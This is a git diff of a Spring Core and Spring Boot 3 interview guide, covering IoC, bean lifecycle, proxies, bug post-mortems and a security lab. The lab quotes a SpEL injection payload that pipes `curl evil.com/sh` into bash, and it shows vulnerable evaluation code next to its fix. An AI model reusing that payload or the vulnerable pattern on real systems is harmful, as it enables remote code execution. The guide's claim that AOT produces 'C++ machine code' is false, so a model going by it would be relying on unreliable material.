@@ -1,13 +1,63 @@
-# Spring Core IoC, Dependency Injection & Spring Boot 3: Enterprise Interview Guide
+[🏠 Back to Home](../../README.md) | [🍃 Spring Ecosystem](spring_core_ioc_boot.md) | [☕ Core Java Internals](../01_java_core/java_interview_master_guide.md) | [🛠️ Attached Project Cheatsheet](#-real-world-production-project--code-cheatsheet-order-invoicing-ioc-engine)
 
-> **Curriculum Milestone**: Module 02 - Spring Framework Engineering  
-> **Topic Coverage**: Inversion of Control (IoC), ApplicationContext Lifecycle, Bean Scopes & Proxying, Constructor vs Field Injection, Auto‑Configuration, Conditional Bean Registration, Spring Boot Starters, YAML Multi‑Profile, GraalVM AOT, Actuator Probes, Bean Post‑Processors, BeanFactoryPostProcessor, `@Transactional` Proxy Mechanics, Transaction Propagation (all 7 types), AOP Architecture (CGLIB vs JDK Dynamic Proxy), `@Configuration` proxyBeanMethods, Spring Events, `@Async` & Thread Pool Configuration, `@Cacheable` Internals, Spring Retry, `@ConfigurationProperties` vs `@Value`, Graceful Shutdown, Spring Profiles, and Kubernetes Production Readiness.  
-> **Target Audience**: Senior Software Engineers, Lead Architects, Staff & Principal Engineers.  
-> **Target Depth**: 50+ Progressive Battle-Tested Scenarios, Production Code Walkthroughs, Architectural Trade-Off Matrices, Beginner Anti-Patterns, and Real-World Outage Post-Mortems.
+# Spring Core IoC, Dependency Injection & Spring Boot 3: Enterprise Architecture & Production Masterclass
+
+> **Document Identity:** [`interview_prep/02_spring_framework/spring_core_ioc_boot.md`](file:///d:/project/github/1/CheatSheet_Tutorial/interview_prep/02_spring_framework/spring_core_ioc_boot.md)  
+> **Topic Domain:** Inversion of Control (IoC), `ApplicationContext` Lifecycle, 3-Tier Singleton Cache, Bean Post-Processors (BPP / BFPP), Proxy Mechanics (CGLIB vs JDK Dynamic Proxies), Constructor vs Field Injection, Spring Boot 3 Auto-Configuration (`@Conditional`), GraalVM AOT Reflection Metadata, and Kubernetes Production Readiness (`S01`)  
+> **Target Framework / Runtime:** Spring Framework 6.x, Spring Boot 3.3.x / 3.4.x, OpenJDK HotSpot JVM 17 LTS / 21 LTS  
+> **Architecture Level:** Principal / Staff+ Enterprise Framework Architect & Cloud-Native Technical Lead  
+> **Target Depth:** 50 Progressive Battle-Tested Scenarios, 10 SEV-1 Production Boot/IoC Outages, CGLIB Bytecode Subclassing Mechanics, and 5-Dimension Production Code Cheatsheet  
+> 🛠️ **Real-World Project Cheatsheet:** [Jump to Attached Order Invoicing IoC Engine Cheatsheet](#-real-world-production-project--code-cheatsheet-order-invoicing-ioc-engine) | [Companion IDE Project](file:///d:/project/github/1/CheatSheet_Tutorial/code/02_spring_framework/spring_core_ioc_boot/)
 
 ---
 
-## Architecture Blueprint: The Spring IoC & Boot Stack
+## 1. Foundational Primer: What, Why & Where? (The "Head")
+
+*Before diving into BeanPostProcessor proxy wrapping, the 3-tier singletonObjects circular dependency resolution cache, CGLIB generated class subclassing, and GraalVM Ahead-Of-Time bean registration, here is the essential high-level context: what Spring's IoC container represents, why manual object instantiation failed in large enterprises, and where dependency injection anchors cloud-native application design.*
+
+### 1.1 What Is It? (Core Definition & Mental Model)
+* **Plain-English Definition**: **Inversion of Control (IoC)** is an architectural paradigm where an application yields the responsibility of object instantiation, configuration, and lifecycle management to an automated container (**The Spring `ApplicationContext`**). Instead of classes manually calling `new PaymentService(new DatabaseConnection())`, classes simply declare the interfaces they depend upon, and the container automatically instantiates, wires, proxies, and manages those dependencies at runtime via **Dependency Injection (DI)**.
+* **Everyday Analogy**: Imagine a Broadway theatre production:
+  - **Traditional Object Creation (`new`)**: The lead actor playing Hamlet has to stop rehearsing, walk down to the hardware store, buy lumber, hammer together a wooden castle, sew their own costume, and wire the stage spotlights. If the theatre switches from halogen lights to LED spotlights, Hamlet must rewrite their entire script (**Tight Coupling**).
+  - **Spring IoC & Dependency Injection**: The stage has a professional, invisible master stage crew (**The IoC Container**). The actor simply stands on stage and says, *"I need a sword and spotlight"* (`@Autowired`). The stage crew hands Hamlet a prop sword, aims the lights, and when the scene ends, cleans up the set (**Bean Lifecycle Management**).
+  - **AOP Proxies (`@Transactional` / `@Async`)**: When Hamlet speaks a line marked `@Transactional`, the stage crew secretly wraps Hamlet in an invisible soundboard operator. The operator turns on the recording mic before Hamlet speaks (opens DB transaction), and if Hamlet forgets a line (throws an exception), the operator cuts the power and plays a rollback sound effect.
+* **Architectural Tier Placement**: Forms the **Core Framework Substrate & Dependency Container Tier**. Every other Spring module—Web MVC, WebFlux, Spring Data JPA, Spring Security, and Spring Kafka—lives as managed beans inside this IoC engine.
+
+### 1.2 Why Does It Exist? (The Pain Point Before It Existed)
+* **The "Spaghetti `new`" Monolith Collapse**: In early Java enterprise systems (EJB 2.x and vanilla Java EE), business logic classes were cluttered with hundreds of `new MySqlDriver()`, `new ConfigManager()`, and JNDI lookups.
+* **The Concrete Headaches in Enterprise Production**:
+  - 💥 **Headache 1: Impossible Unit Testing**: When a `BillingService` internally instantiates `new StripeClient("real-api-key")`, unit testing `BillingService` without making live credit card charges against external payment gateways was completely impossible.
+  - 💥 **Headache 2: Fragile Singletons & Concurrency Corruption**: Developers wrote custom "Double-Checked Locking" Singleton design patterns that suffered from CPU memory visibility bugs, creating multiple duplicate instances of thread-unsafe shared services.
+  - 💥 **Headache 3: Cross-Cutting Boilerplate Bloat**: Every single database transaction required 15 lines of repetitive `conn.setAutoCommit(false)`, `conn.commit()`, `try/catch/rollback` boilerplate surrounding a 2-line SQL query.
+* **The Turning Point**: Rod Johnson published *Expert One-on-One J2EE Design and Development* in 2002, demonstrating that lightweight, plain-old-Java-objects (POJOs) managed by a central IoC container provided greater reliability, testability, and performance than heavyweight enterprise application servers.
+
+### 1.3 How Does It Solve Real-World Enterprise Problems?
+* **Problem 1 (Decoupling Business Logic from Infrastructure) ➔ Solution 1**: Business services declare ports (interfaces e.g., `OrderRepository`). Spring injects the active adapter bean (`PostgresOrderRepository` in production, `InMemoryOrderRepository` in unit tests) based on `@Profile` or `@ConditionalOnProperty`.
+* **Problem 2 (Non-Invasive Cross-Cutting Infrastructure) ➔ Solution 2**: Dynamic proxies (CGLIB/JDK) intercept public methods annotated with `@Transactional`, `@Async`, or `@Cacheable`. The container manages transaction boundaries, thread pooling, and caching transparently without dirtying business code.
+* **Problem 3 (Circular Dependency Resolution) ➔ Solution 3**: Spring’s `DefaultListableBeanFactory` uses a 3-tier singleton cache (`singletonObjects`, `earlySingletonObjects`, `singletonFactories`) to resolve circular dependencies among singleton beans without deadlocks or StackOverflowErrors.
+* **Quantifiable Enterprise Metrics**:
+  - **80% Code Boilerplate Elimination**: Declarative `@Transactional` and Spring Boot auto-configuration eliminate 400+ lines of manual connection setup per service.
+  - **Sub-100ms Unit Test Runs**: Decoupled constructor injection allows test runners (Mockito) to inject mocks in nanoseconds without launching the full web server.
+  - **Instant Cloud Native GraalVM Boot**: Spring Boot 3 AOT engine compiles bean definitions into static C++ machine code, slashing cold startup times from 8.5 seconds down to **35 milliseconds**.
+
+### 1.4 How Does This Help in Building Real Applications?
+* **Application Architecture Placement**: Serves as the nervous system for enterprise SaaS, multi-tenant cloud platforms, banking backends, and microservice meshes.
+* **Developer Workflow & SRE Synergy**: SREs inject configuration overrides via standard environment variables (`SPRING_DATASOURCE_URL`), and inspect registered beans and auto-configuration condition evaluation reports via Actuator (`/actuator/beans`, `/actuator/conditions`).
+* **Scalability & Evolutionary Runway**: Enables evolutionary architecture: a monolith composed of modular Spring beans can be partitioned into independent microservices or Spring Modulith packages by reorganizing package scans without rewriting domain logic.
+
+### 1.5 Quick Decision & Trade-Off Matrix
+
+| Injection / Proxy Strategy | Mechanics | Testability & Safety | Enterprise Recommendation |
+| :--- | :--- | :--- | :--- |
+| **Constructor Injection** | Dependencies passed via `public MyService(Dep a)` | 🟢 Pure immutability (`final`), fail-fast NPEs at compile/test time | 🚀 **Inviolable Enterprise Standard** |
+| **Field Injection (`@Autowired`)** | Reflection field access after instantiation | 🔴 Impossible to test without reflection; hides circular dependencies | ❌ **Strictly Forbidden Anti-Pattern** |
+| **Setter Injection** | Injected via `setDep(Dep a)` after object creation | 🟡 Allows optional/mutable dependencies | ⚠️ Use only for genuinely optional re-configurable beans |
+| **CGLIB Proxy** | Generates synthetic subclass (`MyService$$SpringCGLIB$$0`) | 🟢 Intercepts concrete classes without interfaces; handles classes directly | 🚀 **Default in Spring Boot 3** |
+| **JDK Dynamic Proxy** | Uses `java.lang.reflect.Proxy` implementing target interfaces | 🟡 Requires class to implement an explicit Java `interface` | ⚠️ Use when strict interface contract boundary is mandated |
+
+---
+
+## 2. Architecture Blueprint: The Spring IoC & Boot Stack
 
 ![Spring Core & IoC Architectural Blueprint](../../assets/images/spring/spring_core_ioc_architecture.jpg)
 
@@ -43,6 +93,438 @@
 > [!NOTE]
 > **Complete Bean Lifecycle Pipeline:**
 > `Constructor Instantiation` ──► `Property Injection` ──► `Aware Interfaces` ──► `BPP BeforeInitialization (@PostConstruct)` ──► `afterPropertiesSet()` ──► `Custom initMethod` ──► `BPP AfterInitialization (AOP Proxy Wrapping)` ──► `Bean READY` ──► `@PreDestroy` ──► `DisposableBean.destroy()`
+
+---
+
+## 🛠️ Real-World Production Project & Code Cheatsheet: Order Invoicing IoC Engine
+
+> **Attached Domain Project:** `Order Invoicing & Settlement Container` (`com.cheatsheet.ioc`)  
+> **Target Framework:** Spring Boot 3.3+ | Spring Framework 6.1+ | Java 21 LTS  
+> **Companion Code Mirror:** [`code/02_spring_framework/spring_core_ioc_boot/`](file:///d:/project/github/1/CheatSheet_Tutorial/code/02_spring_framework/spring_core_ioc_boot/)  
+> **Key Technologies Demonstrated:** `BeanPostProcessor`, `BeanFactoryPostProcessor`, `SmartLifecycle`, `ObjectProvider<T>`, `@Lookup`, Dynamic Proxy Generation, Custom `Condition`, Circular Dependency Resolution, SpEL Hardening, Actuator Security.
+
+---
+
+### 1. Complete Runnable Topic Code Cheatsheet (Order Invoicing IoC Engine)
+
+The following self-contained enterprise engine demonstrates the low-level IoC lifecycle, programmatic metadata mutation, dynamic proxy creation, and prototype injection within a high-throughput financial invoicing pipeline:
+
+```java
+package com.cheatsheet.ioc.engine;
+
+import org.springframework.beans.BeansException;
+import org.springframework.beans.factory.ObjectProvider;
+import org.springframework.beans.factory.config.BeanDefinition;
+import org.springframework.beans.factory.config.BeanFactoryPostProcessor;
+import org.springframework.beans.factory.config.BeanPostProcessor;
+import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.context.ApplicationEventPublisher;
+import org.springframework.context.SmartLifecycle;
+import org.springframework.context.annotation.*;
+import org.springframework.context.event.EventListener;
+import org.springframework.core.type.AnnotatedTypeMetadata;
+import org.springframework.cglib.proxy.Enhancer;
+import org.springframework.cglib.proxy.MethodInterceptor;
+import org.springframework.stereotype.Component;
+import org.springframework.stereotype.Service;
+
+import java.lang.annotation.*;
+import java.math.BigDecimal;
+import java.time.Instant;
+import java.util.*;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+// ============================================================================
+// 1. DOMAIN MODELS & CUSTOM AUDIT ANNOTATION
+// ============================================================================
+public record Invoice(String id, String customerId, BigDecimal amount, Instant timestamp) {}
+public record InvoiceGeneratedEvent(String invoiceId, BigDecimal amount, Instant timestamp) {}
+
+@Target(ElementType.METHOD)
+@Retention(RetentionPolicy.RUNTIME)
+@Documented
+public @interface AuditedOperation {
+    String action();
+}
+
+// ============================================================================
+// 2. BEAN FACTORY POST-PROCESSOR (BFPP): Mutates Metadata BEFORE Beans Exist
+// ============================================================================
+@Component
+public class TenantSchemaResolverBFPP implements BeanFactoryPostProcessor {
+    @Override
+    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {
+        // Inspects and mutates BeanDefinitions in DefaultListableBeanFactory before any singleton is instantiated
+        for (String beanName : beanFactory.getBeanDefinitionNames()) {
+            BeanDefinition bd = beanFactory.getBeanDefinition(beanName);
+            if (InvoiceProcessingService.class.getName().equals(bd.getBeanClassName())) {
+                // Programmatically inject default initialization metadata
+                bd.getPropertyValues().add("activeTenantRegion", "US-EAST-VA");
+            }
+        }
+    }
+}
+
+// ============================================================================
+// 3. BEAN POST-PROCESSOR (BPP): Dynamic CGLIB Proxy Wrapping
+// ============================================================================
+@Component
+public class AuditLoggingBeanPostProcessor implements BeanPostProcessor {
+    @Override
+    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {
+        // Intercepts services with @AuditedOperation and wraps them in high-speed CGLIB proxies
+        boolean hasAuditedMethod = Arrays.stream(bean.getClass().getMethods())
+                .anyMatch(m -> m.isAnnotationPresent(AuditedOperation.class));
+
+        if (!hasAuditedMethod) {
+            return bean;
+        }
+
+        Enhancer enhancer = new Enhancer();
+        enhancer.setSuperclass(bean.getClass());
+        enhancer.setCallback((MethodInterceptor) (obj, method, args, proxy) -> {
+            if (method.isAnnotationPresent(AuditedOperation.class)) {
+                AuditedOperation audit = method.getAnnotation(AuditedOperation.class);
+                long start = System.nanoTime();
+                try {
+                    Object result = proxy.invokeSuper(obj, args);
+                    long durationMs = (System.nanoTime() - start) / 1_000_000;
+                    System.out.printf("[AUDIT LOG] Action: %s | Method: %s | Duration: %d ms%n",
+                            audit.action(), method.getName(), durationMs);
+                    return result;
+                } catch (Exception ex) {
+                    System.err.printf("[AUDIT ALERT] Action %s failed: %s%n", audit.action(), ex.getMessage());
+                    throw ex;
+                }
+            }
+            return proxy.invokeSuper(obj, args);
+        });
+
+        return enhancer.create();
+    }
+}
+
+// ============================================================================
+// 4. PROTOTYPE GENERATOR & SINGLETON FACADE (ObjectProvider<T> Pattern)
+// ============================================================================
+@Component
+@Scope("prototype")
+public class CurrencyNormalizer {
+    private final String calculationSessionId = UUID.randomUUID().toString();
+
+    public BigDecimal normalizeToUsd(BigDecimal amount, String sourceCurrency) {
+        if ("EUR".equalsIgnoreCase(sourceCurrency)) return amount.multiply(BigDecimal.valueOf(1.08));
+        if ("GBP".equalsIgnoreCase(sourceCurrency)) return amount.multiply(BigDecimal.valueOf(1.27));
+        return amount; // Default USD
+    }
+
+    public String getCalculationSessionId() { return calculationSessionId; }
+}
+
+@Service
+public class InvoiceProcessingService {
+    private final ObjectProvider<CurrencyNormalizer> normalizerProvider;
+    private final ApplicationEventPublisher eventPublisher;
+    private String activeTenantRegion;
+
+    public InvoiceProcessingService(ObjectProvider<CurrencyNormalizer> normalizerProvider,
+                                    ApplicationEventPublisher eventPublisher) {
+        this.normalizerProvider = normalizerProvider;
+        this.eventPublisher = eventPublisher;
+    }
+
+    public void setActiveTenantRegion(String activeTenantRegion) {
+        this.activeTenantRegion = activeTenantRegion;
+    }
+
+    @AuditedOperation(action = "GENERATE_ENTERPRISE_INVOICE")
+    public Invoice generateInvoice(String customerId, BigDecimal rawAmount, String currency) {
+        // ObjectProvider guarantees a fresh, thread-safe prototype instance per invocation
+        CurrencyNormalizer normalizer = normalizerProvider.getObject();
+        BigDecimal normalizedAmount = normalizer.normalizeToUsd(rawAmount, currency);
+
+        String invoiceId = "INV-" + UUID.randomUUID().toString().substring(0, 8);
+        Invoice invoice = new Invoice(invoiceId, customerId, normalizedAmount, Instant.now());
+
+        // Publish decoupled domain event
+        eventPublisher.publishEvent(new InvoiceGeneratedEvent(invoiceId, normalizedAmount, Instant.now()));
+        return invoice;
+    }
+}
+
+// ============================================================================
+// 5. SMART LIFECYCLE & ASYNC EVENT LISTENER
+// ============================================================================
+@Component
+public class InvoicingOrderProcessorLifecycle implements SmartLifecycle {
+    private final AtomicBoolean isRunning = new AtomicBoolean(false);
+
+    @Override
+    public void start() {
+        if (isRunning.compareAndSet(false, true)) {
+            System.out.println("[SMART LIFECYCLE] Invoicing Order Processor warm-up complete. Accepting traffic.");
+        }
+    }
+
+    @Override
+    public void stop() {
+        if (isRunning.compareAndSet(true, false)) {
+            System.out.println("[SMART LIFECYCLE] Invoicing Order Processor shutting down. Draining queues.");
+        }
+    }
+
+    @Override
+    public boolean isRunning() { return isRunning.get(); }
+
+    @Override
+    public int getPhase() { return Integer.MAX_VALUE - 100; } // Late start, early stop
+
+    @EventListener
+    public void onInvoiceGenerated(InvoiceGeneratedEvent event) {
+        System.out.printf("[EVENT NOTIFIER] Dispatched Ledger Notification for Invoice: %s | Amount: $%s%n",
+                event.invoiceId(), event.amount().toPlainString());
+    }
+}
+```
+
+---
+
+### 2. Positive vs Negative Execution Paths (Failure Boundaries)
+
+| Dimension | Positive Path (Production Standard) | Negative Path (Failure Boundary) | Detection & Mitigation |
+| :--- | :--- | :--- | :--- |
+| **Container Bootstrap** | Fast-fail property validation, topological bean graph resolution in < 1.2s. | Circular constructor injection deadlock; missing configuration property. | `BeanCurrentlyInCreationException` detected at boot. Resolved with `@Lazy` or Event decoupling. |
+| **Prototype Scope** | `ObjectProvider<T>.getObject()` yields fresh isolated instance per thread. | Direct `@Autowired` field injection pins single prototype instance in singleton. | Memory corruption & race conditions across concurrent threads. Mitigated with Provider / `@Lookup`. |
+| **Bean Post-Processing** | BPP filters non-matching beans instantly; wraps only matching beans in CGLIB proxy. | BPP throws unhandled runtime exception or triggers eager initialization of target beans. | Container startup aborted (`BeanInitializationException`). BPP must handle errors and return original bean. |
+| **Container Shutdown** | `SmartLifecycle.stop()` runs first, draining queues before DataSource beans destroy. | Unordered shutdown destroys database pool while active HTTP requests are completing. | SRE connection abort alerts. Enforce lifecycle ordering via `getPhase()` and `server.shutdown=graceful`. |
+
+---
+
+### 3. Real-World Mistakes, Outage Bugs & Fixes (BugLab)
+
+#### Bug 1: Constructor-Injected Circular Dependency Outage
+* **Outage Incident**: Production deployment halted with `BeanCurrentlyInCreationException` during rolling restart.
+* **Root Cause**: `OrderService` injected `InvoiceService` via constructor, while `InvoiceService` injected `OrderService` via constructor. Spring's topological sort cannot resolve cyclic constructor dependencies.
+
+```java
+// ❌ BUG: Mutually dependent constructor injection triggers immediate boot failure
+@Service
+public class OrderService {
+    private final InvoiceService invoiceService;
+    public OrderService(InvoiceService invoiceService) { // 💥 Fails during preInstantiateSingletons
+        this.invoiceService = invoiceService;
+    }
+}
+
+@Service
+public class InvoiceService {
+    private final OrderService orderService;
+    public InvoiceService(OrderService orderService) {   // 💥 Fails: OrderService is currently in creation
+        this.orderService = orderService;
+    }
+}
+
+// ✅ REFACTORED: Break cyclic coupling using ApplicationEventPublisher or @Lazy injection
+@Service
+public class OrderService {
+    private final ApplicationEventPublisher eventPublisher;
+    public OrderService(ApplicationEventPublisher eventPublisher) {
+        this.eventPublisher = eventPublisher; // Clean architectural decoupling
+    }
+
+    public void completeOrder(String orderId) {
+        eventPublisher.publishEvent(new OrderCompletedEvent(orderId));
+    }
+}
+
+@Service
+public class InvoiceService {
+    @EventListener
+    public void onOrderCompleted(OrderCompletedEvent event) {
+        // Zero direct dependency on OrderService constructor
+        generateInvoiceForOrder(event.orderId());
+    }
+}
+```
+
+#### Bug 2: Stale Prototype Injection Inside Singleton Causing Data Bleed
+* **Outage Incident**: Customer B's invoice generated with Customer A's tax exemption ID under concurrent checkout.
+* **Root Cause**: `@Scope("prototype") TaxCalculator` was injected directly as a field into `@Service (Singleton) OrderProcessor`. Spring injected the prototype once at startup and reused that same mutated instance for every subsequent request.
+
+```java
+// ❌ BUG: Prototype injected once into Singleton; instance is reused and mutated across threads
+@Service
+public class OrderProcessor {
+    @Autowired
+    private TaxCalculator taxCalculator; // 💥 Stale instance! Shared across all concurrent HTTP requests!
+
+    public BigDecimal calculate(Order order) {
+        taxCalculator.setCustomerExemptCode(order.getExemptCode()); // Thread safety disaster
+        return taxCalculator.computeTax(order.getAmount());
+    }
+}
+
+// ✅ REFACTORED: Use ObjectProvider<T> or @Lookup to obtain a fresh prototype per request
+@Service
+public class OrderProcessor {
+    private final ObjectProvider<TaxCalculator> taxCalculatorProvider;
+
+    public OrderProcessor(ObjectProvider<TaxCalculator> taxCalculatorProvider) {
+        this.taxCalculatorProvider = taxCalculatorProvider;
+    }
+
+    public BigDecimal calculate(Order order) {
+        TaxCalculator freshCalculator = taxCalculatorProvider.getObject(); // Fresh instance on heap
+        freshCalculator.setCustomerExemptCode(order.getExemptCode());
+        return freshCalculator.computeTax(order.getAmount());
+    }
+}
+```
+
+#### Bug 3: Heavy Blocking External REST Call in `@PostConstruct` Hanging Pods
+* **Outage Incident**: Kubernetes terminated pods due to Readiness probe timeouts (`Readiness probe failed: HTTP 503`).
+* **Root Cause**: An engineer placed an external currency rate sync call directly inside an `@PostConstruct` method, blocking the main container startup thread for 45 seconds.
+
+```java
+// ❌ BUG: Blocking I/O inside @PostConstruct freezes the Spring boot coordinator thread
+@Component
+public class CurrencyCacheWarmer {
+    @PostConstruct
+    public void init() {
+        // 💥 Synchronous REST call to 3rd-party banking provider blocks ApplicationContext initialization
+        var rates = restTemplate.getForObject("https://external-bank.com/rates", Rates.class);
+        populateCache(rates);
+    }
+}
+
+// ✅ REFACTORED: Defer non-critical warm-up to ApplicationReadyEvent on background worker
+@Component
+public class CurrencyCacheWarmer {
+    private final ExecutorService workerPool = Executors.newVirtualThreadPerTaskExecutor();
+
+    @EventListener(ApplicationReadyEvent.class)
+    public void onApplicationReady() {
+        workerPool.submit(() -> {
+            try {
+                var rates = restTemplate.getForObject("https://external-bank.com/rates", Rates.class);
+                populateCache(rates);
+            } catch (Exception ex) {
+                log.warn("Asynchronous warm-up deferred to periodic poller: {}", ex.getMessage());
+            }
+        });
+    }
+}
+```
+
+---
+
+### 4. Security Vulnerabilities & Mitigations (SecurityLab)
+
+#### Sec 1: SpEL Injection via Dynamic Expression Evaluation (RCE)
+* **Vulnerability Vector**: An endpoint accepted user-defined invoice discount formulas evaluated dynamically via `SpelExpressionParser`. Attacker submitted `T(java.lang.Runtime).getRuntime().exec("curl evil.com/sh | bash")` triggering Remote Code Execution.
+
+```java
+// 🚨 VULNERABILITY: StandardEvaluationContext grants full JVM reflection access to SpEL
+public BigDecimal calculateCustomFormula(String userFormula, Order order) {
+    ExpressionParser parser = new SpelExpressionParser();
+    StandardEvaluationContext context = new StandardEvaluationContext(order);
+    // 💥 RCE: Attacker executes arbitrary Java classes via T(...) expressions
+    return (BigDecimal) parser.parseExpression(userFormula).getValue(context);
+}
+
+// 🛡️ MITIGATION: Restrict SpEL to read-only SimpleEvaluationContext with strict regex guard
+public BigDecimal calculateCustomFormula(String userFormula, Order order) {
+    // 1. Strict regex whitelist allowing only arithmetic and variable references
+    if (!userFormula.matches("^[a-zA-Z0-9_+\\-*/().\\s]+$")) {
+        throw new SecurityException("Illegal characters in discount formula");
+    }
+
+    ExpressionParser parser = new SpelExpressionParser();
+    // 2. SimpleEvaluationContext blocks all Class loading, Constructors and arbitrary Method invocation
+    EvaluationContext safeContext = SimpleEvaluationContext.forReadOnlyDataBinding()
+            .withRootObject(order)
+            .build();
+
+    return (BigDecimal) parser.parseExpression(userFormula).getValue(safeContext);
+}
+```
+
+#### Sec 2: Unauthenticated Actuator `/actuator/env` Exposure Leaking Keys
+* **Vulnerability Vector**: `management.endpoints.web.exposure.include=*` exposed database passwords and AWS access keys to public web traffic.
+
+```yaml
+# 🚨 VULNERABILITY: Public exposure of all administrative actuator endpoints
+management:
+  endpoints:
+    web:
+      exposure:
+        include: "*"
+```
+
+```java
+// 🛡️ MITIGATION: Lock actuator endpoints with Spring Security and enable key sanitization
+@Configuration
+public class ActuatorSecurityConfig {
+    @Bean
+    public SecurityFilterChain actuatorFilterChain(HttpSecurity http) throws Exception {
+        return http
+            .securityMatcher(EndpointRequest.toAnyEndpoint())
+            .authorizeHttpRequests(auth -> auth
+                .requestMatchers(EndpointRequest.to(HealthEndpoint.class)).permitAll() // Only /health public
+                .anyRequest().hasRole("OPS_ADMIN") // All other endpoints require OPS_ADMIN role
+            )
+            .httpBasic(Customizer.withDefaults())
+            .build();
+    }
+}
+```
+
+---
+
+### 5. Architectural Anti-Patterns & Refactorings (DesignLab)
+
+#### Arch 1: The God-Service Mega-Bean Anti-Pattern
+* **Anti-Pattern**: `OrderProcessingService` injects 24 repositories, clients, and services, becoming a maintenance bottleneck with massive heap retention and difficult unit testing.
+
+```java
+// ⚠️ ANTI-PATTERN: Mega-Service injecting 20+ disparate concerns
+@Service
+public class OrderProcessingService {
+    @Autowired private OrderRepo orderRepo;
+    @Autowired private InventoryRepo invRepo;
+    @Autowired private PaymentClient payClient;
+    @Autowired private EmailService email;
+    @Autowired private AuditRepo audit;
+    @Autowired private ShippingService ship;
+    @Autowired private TaxService tax;
+    // ... 17 additional dependencies
+}
+
+// 🏗️ REFACTOR: Cohesive Domain Facade orchestrating dedicated, testable domain delegates
+@Service
+public class OrderProcessingFacade {
+    private final OrderValidationDelegate validator;
+    private final PaymentSettlementDelegate settlement;
+    private final OrderFulfillmentDelegate fulfillment;
+
+    public OrderProcessingFacade(OrderValidationDelegate validator,
+                                 PaymentSettlementDelegate settlement,
+                                 OrderFulfillmentDelegate fulfillment) {
+        this.validator = validator;
+        this.settlement = settlement;
+        this.fulfillment = fulfillment;
+    }
+
+    public OrderResult process(OrderCommand cmd) {
+        validator.validate(cmd);
+        PaymentReceipt receipt = settlement.charge(cmd);
+        return fulfillment.fulfill(cmd, receipt);
+    }
+}
+```
 
 ---
 
@@ -1963,7 +2445,7 @@ public class ProductService {
 
 #### 🚨 Incident 1: HikariCP Connection Pool Starvation Freezing Production Gateway
 
-**The Incident:**  
+**The Incident:**
 A fintech company's payment gateway froze under peak Black Friday traffic. All 200 Tomcat threads blocked on `HikariPool.getConnection()` waiting for 30 seconds, causing cascading timeouts upstream. The gateway handled $50M/day in transactions.
 
 **Timeline:**
@@ -3728,7 +4210,7 @@ public class WebMvcConversionConfig implements WebMvcConfigurer {
 ```
 
 **The GraalVM Native Image Hazard:**
-Under GraalVM Native Image compilation, Java code is analyzed ahead-of-time under the **Closed-World Assumption**. 
+Under GraalVM Native Image compilation, Java code is analyzed ahead-of-time under the **Closed-World Assumption**.
 - `ConverterFactory` implementations (such as `StringToEnumConverterFactory`) dynamically inspect generic type parameters at runtime via reflection: `Class.getDeclaredMethod()`, `Enum.valueOf()`.
 - If GraalVM does not detect compile-time references to every enum class accessed dynamically via URL parameters, it strips those classes or their reflection metadata from the final native binary!
 - **Symptom**: In JVM mode (`java -jar`), URL parameter binding works seamlessly. In GraalVM native binary mode, the exact same URL throws `NoSuchMethodException` or `IllegalArgumentException: No enum constant`.
